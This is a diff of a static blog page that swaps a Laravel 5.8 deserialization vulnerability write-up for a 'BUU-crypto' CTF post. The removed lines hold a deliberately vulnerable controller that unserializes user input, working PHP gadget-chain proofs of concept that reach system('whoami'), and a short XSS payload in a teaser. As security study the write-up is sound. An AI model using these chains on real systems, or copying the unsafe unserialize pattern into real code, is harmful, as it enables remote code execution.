@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Laravel 5.8.x 漏洞分析, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="BUU-crypto, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Laravel 5.8.x 漏洞分析 | V1cuna&#39;s blog</title>
+    <title>BUU-crypto | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -286,12 +286,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Laravel 5.8.x 漏洞分析</h1>
+                    <h1 class="description center-align post-title">BUU-crypto</h1>
                 </div>
             </div>
         </div>
@@ -406,9 +406,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WP/">
+                                <span class="chip bg-color">WP</span>
+                            </a>
+                        
+                            <a href="/tags/BUU/">
+                                <span class="chip bg-color">BUU</span>
+                            </a>
+                        
+                            <a href="/tags/crypto/">
+                                <span class="chip bg-color">crypto</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -420,7 +436,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-02
+                    2020-11-05
                 </div>
                 
 
@@ -429,7 +445,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    52
                 </div>
                 
 
@@ -446,175 +462,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Laravel-5-8-x-漏洞分析"><a href="#Laravel-5-8-x-漏洞分析" class="headerlink" title="Laravel 5.8.x 漏洞分析"></a>Laravel 5.8.x 漏洞分析</h1><p>据中哥说①环境出了点问题②有五条链子，但是我今天自己只跟出来三条（一条好像被修了）。。。wtcl，没分析出来的我把连接放上。</p>
-<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><pre><code>composer create-project --prefer-dist laravel/laravel blog "5.8.*"
-php artisan serve --host=0.0.0.0  //一般就是命令行执行这个命令呀</code></pre><ul>
-<li><p>在 <code>laravel58/routes/web.php</code> 文件添加路由</p>
-<pre><code class="php">Route::get("/","\App\Http\Controllers\DemoController@demo");</code></pre>
-</li>
-<li><p>在 <code>laravel58/app/Http/Controllers/</code> 下添加 <code>DemoController.php</code> 控制器</p>
-<pre><code class="php">&lt;?php
-namespace App\Http\Controllers;
-
-class DemoController extends Controller
-{
-    public function demo()
-    {
-        if(isset($_GET['c'])){
-            $code = $_GET['c'];
-            unserialize($code);
-        }
-        else{
-            highlight_file(__FILE__);
-        }
-        return "Welcome to laravel5.8";
-    }
-}</code></pre>
-</li>
-</ul>
-<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><a href="https://learnku.com/docs/laravel/5.8/structure/3881" target="_blank" rel="noopener">https://learnku.com/docs/laravel/5.8/structure/3881</a></p>
-<h2 id="POP链1【5-8被修了。。。】"><a href="#POP链1【5-8被修了。。。】" class="headerlink" title="POP链1【5.8被修了。。。】"></a>POP链1【5.8被修了。。。】</h2><p><strong>这条链的起点在Illuminate\Foundation\Testing\PendingCommand::__destruct</strong></p>
-<p><img src="https://i.loli.net/2020/10/11/a6ZLxhlWETnsIoP.png" alt="Snipaste_2020-10-11_15-33-31.png"></p>
-<p><img src="https://i.loli.net/2020/10/11/a8XKFOBJU2dieZQ.png" alt="Snipaste_2020-10-11_15-45-54.png"></p>
-<p>并且可以看到<code>hasExecuted</code>默认是false</p>
-<p><img src="https://i.loli.net/2020/10/11/dUh8sxY2OmByuDn.png" alt="Snipaste_2020-10-11_16-08-14.png"></p>
-<p>如果是true的话：</p>
-<ol>
-<li><p>执行<code>mockConsoleOutput()</code></p>
-</li>
-<li><p>在<code>run</code>方法中会调用<code>$this-&gt;app[Kernel::class]</code>这个类的<code>call</code>方法，传入的参数<code>$this-&gt;command</code>和<code>$this-&gt;parameters</code>都可控</p>
-</li>
-</ol>
-<p>在<strong>vendor/laravel/framework/src/Illuminate/Contracts/Console/Kernel.php</strong>中发现了<code>call</code>方法</p>
-<p>要求<code>$parameters</code>参数是<strong>数组格式</strong></p>
-<p>但是后面好像被修了·····虽然不报错，但是无法执行文件</p>
-<p><a href="http://zwalts.com/post/php_laravel_deserilization/#poc" target="_blank" rel="noopener">http://zwalts.com/post/php_laravel_deserilization/#poc</a></p>
-<h2 id="POP链2"><a href="#POP链2" class="headerlink" title="POP链2"></a>POP链2</h2><p><strong>此链分析和刘凡瑞师傅博客中的分析基本一致，都是从跟__destruct()开始进行逐步分析</strong></p>
-<p>POP链的起点是<strong>laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast::__destruct()</strong></p>
-<p>我们发现参数<code>$this-&gt;events</code>是可控的，我们能调用任意类的<code>dispatch</code>方法。</p>
-<p>我们跟一下<code>dispatch</code>：</p>
-<p><img src="https://i.loli.net/2020/10/11/2lD3hH7iVzgE6YI.png" alt="Snipaste_2020-10-11_15-47-53.png">)<img src="https://i.loli.net/2020/10/11/svZdugUL2bljzoi.png" alt="Snipaste_2020-10-11_15-48-13.png">)<img src="https://i.loli.net/2020/10/11/6kUw8ai2yEPVOg7.png" alt="Snipaste_2020-10-11_15-58-32.png"></p>
-<p>如果可以满足第一个<code>if</code>条件，则可以调用<code>dispatchToQueue</code>方法，那么<code>$queue</code>引入的<code>call_user_func</code>函数就可以调用任意方法。</p>
-<p>为了让<code>dispatch</code>的<code>if</code>条件为真，我们关注一下可控的<code>$this-&gt;queueResolver</code>和所在的<code>commandShouldBeQueued</code>方法：</p>
-<p>该方法中要返回真，只需要让<code>$command</code>，对应<code>PendingBroadcast</code>类中的<code>$this-&gt;event</code>是一个继承于<code>ShouldQueue</code>接口的类即可。</p>
-<p>到这里基本上可以实现命令执行：</p>
-<p><strong>POC：</strong></p>
-<pre><code class="php">&lt;?php
-
-namespace Illuminate\Broadcasting{
-    class PendingBroadcast
-    {
-        protected $events;
-        protected $event;
-
-        public function __construct($events="",$event="")
-        {
-            $this-&gt;events = $events;
-            $this-&gt;event = $event;
-        }
-    }
-}
-
-namespace Illuminate\Bus{
-    class Dispatcher
-    {
-        protected $queueResolver = "system";
-    }
-}
-
-namespace Illuminate\Broadcasting{
-    class BroadcastEvent
-    {
-        public $connection = "whoami";
-    }
-}
-
-namespace{
-    $d = new Illuminate\Bus\Dispatcher();
-    $b = new Illuminate\Broadcasting\BroadcastEvent();
-    $p = new Illuminate\Broadcasting\PendingBroadcast($d,$b);
-    echo urlencode(serialize($p));
-}
-
-?&gt;</code></pre>
-<p><img src="https://i.loli.net/2020/10/11/6kUw8ai2yEPVOg7.png" alt="Snipaste_2020-10-11_15-58-32.png"></p>
-<h2 id="POP链3"><a href="#POP链3" class="headerlink" title="POP链3"></a>POP链3</h2><p>这条链存在<strong>symfony</strong>组件中，默认安装的<strong>laravel5.8</strong>中没有该组件。需要在<strong>composer.json</strong>文件的<strong>require</strong>添加<code>"symfony/symfony":"4.*"</code>，然后执行<code>composer update</code>命令更新</p>
-<p>POP链起点在<strong>Symfony\Component\Cache\Adapter\TagAwareAdapter::__destruct()</strong></p>
-<p>这条链子倒是不难：</p>
-<p>__destruct  -&gt;   commit    -&gt;     invalidateTags([])      -&gt;    <code>$this-&gt;pool</code>  -&gt;saveDeferred (实例化proxyadapter)    -&gt; doSave(要求传入的<code>$item</code>参数为继承<code>CacheItemInterface</code>的类对象)</p>
-<p>在<code>doSave</code>方法中，<code>$item</code>首先经过<code>(array)$item</code>后强制转化为<strong>数组</strong>。<code>$item</code>转化为<strong>数组</strong>后，再从数组中取键名<code>\0*\0innerItem</code>的键值赋值给参数<code>$innerItem</code>作为末尾<strong>245行</strong>，<strong>动态函数执行</strong>中的参数</p>
-<p><code>$item["\0*\0poolHash"]</code>这种写法，数组键名中带有<strong>\0*\0</strong>，实际上是类中修饰符为<strong>protected</strong>的属性，在类强制转化为<strong>数组</strong>后的结果，测试代码如下：</p>
-<pre><code class="php">&lt;?php
-
-class Foo{
-    private $var1 = 1;
-    protected $var2 = 2;
-    public $var3 = 3;
-}
-
-$f = new Foo();
-$f = (array)$f;
-foreach ($f as $key =&gt; $value) {
-    echo "key: ".urlencode($key)."&lt;br&gt;value: ".$value."&lt;br&gt;";
-}</code></pre>
-<p>所以，我们只需让参数<code>$item</code>为继承<code>CacheItemInterface</code>的类对象。然后赋值其<code>innerItem</code>，<code>poolHash</code>属性即可</p>
-<p>最后，动态调用的函数有两个参数，刚好<code>system</code>函数支持两个参数</p>
-<p>链子如下：</p>
-<p><img src="https://i.loli.net/2020/10/11/SjFOQPnbJehtw39.png" alt="Snipaste_2020-10-11_16-08-16.png"></p>
-<p><strong>POC：</strong></p>
-<pre><code class="php">&lt;?php
-
-namespace Symfony\Component\Cache\Adapter{
-    class TagAwareAdapter
-    {
-        private $deferred;
-        private $pool;
-
-        public function __construct($deferred="",$pool="")
-        {
-            $this-&gt;deferred = $deferred;
-            $this-&gt;pool = $pool;
-        }
-    }
-}
-
-namespace Symfony\Component\Cache\Adapter{
-    class ProxyAdapter
-    {
-        private $setInnerItem;
-        private $poolHash;
-
-        public function __construct($setInnerItem="",$poolHash="")
-        {
-            $this-&gt;setInnerItem = $setInnerItem;
-            $this-&gt;poolHash = $poolHash;
-        }
-    }
-}
-
-namespace Symfony\Component\Cache{
-    class CacheItem
-    {
-        protected $poolHash;
-        protected $innerItem;
-
-        public function __construct($poolHash="",$innerItem="")
-        {
-            $this-&gt;poolHash = $poolHash;
-            $this-&gt;innerItem = $innerItem;
-        }
-    }
-}
-
-namespace{
-    $p = new Symfony\Component\Cache\Adapter\ProxyAdapter("system","1");
-    $c = new Symfony\Component\Cache\CacheItem("1","whoami");
-    $t = new Symfony\Component\Cache\Adapter\TagAwareAdapter(array("1"=&gt;$c),$p);
-    echo urlencode(serialize($t));
-}
-
-?&gt;</code></pre>
-<script>
+                <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -657,7 +505,7 @@ namespace{
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.hackyangtuo.top/posts/271d.html">https://www.hackyangtuo.top/posts/271d.html</a>
+                    <a href="https://www.hackyangtuo.top/posts/7f16.html">https://www.hackyangtuo.top/posts/7f16.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -694,7 +542,23 @@ namespace{
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WP/">
+                                    <span class="chip bg-color">WP</span>
+                                </a>
+                            
+                                <a href="/tags/BUU/">
+                                    <span class="chip bg-color">BUU</span>
+                                </a>
+                            
+                                <a href="/tags/crypto/">
+                                    <span class="chip bg-color">crypto</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -738,27 +602,37 @@ namespace{
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/7f16.html">
+                <a href="/posts/ab7.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="BUU-crypto">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="BUU-web分类整理">
                         
-                        <span class="card-title">BUU-crypto</span>
+                        <span class="card-title">BUU-web分类整理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            PHPHeader以及特殊技巧[BJDCTF 2nd]假猪套天下第一难度：易
+考点：Header请求头
+
+
+
+Header
+解释
+示例
+
+
+
+Accept
+指定客户端能够接收的内容类型
+Accept: text/plain, text/ht
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-02
                         </span>
                         <span class="publish-author">
                             
@@ -783,10 +657,6 @@ namespace{
                         <span class="chip bg-color">BUU</span>
                     </a>
                     
-                    <a href="/tags/crypto/">
-                        <span class="chip bg-color">crypto</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -798,26 +668,25 @@ namespace{
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/a08b.html">
+                <a href="/posts/271d.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/2.jpg" class="responsive-img" alt="XSS-labs WP">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="Laravel 5.8.x 漏洞分析">
                         
-                        <span class="card-title">XSS-labs WP</span>
+                        <span class="card-title">Laravel 5.8.x 漏洞分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Level1最简单的payload：
-?name=&lt;script&gt;alert('V1cuna')&lt;/script&gt;Level2需要闭合input和value，payload：
-?keyword="&gt;&lt;sc
+                            Laravel 5.8.x 漏洞分析据中哥说①环境出了点问题②有五条链子，但是我今天自己只跟出来三条（一条好像被修了）。。。wtcl，没分析出来的我把连接放上。
+搭建环境composer create-project --prefer-di
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-02
                             </span>
                         <span class="publish-author">
                             
@@ -826,14 +695,6 @@ namespace{
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/XSS-WP/">
-                        <span class="chip bg-color">-XSS -WP</span>
-                    </a>
-                    
                 </div>
                 
             </div>
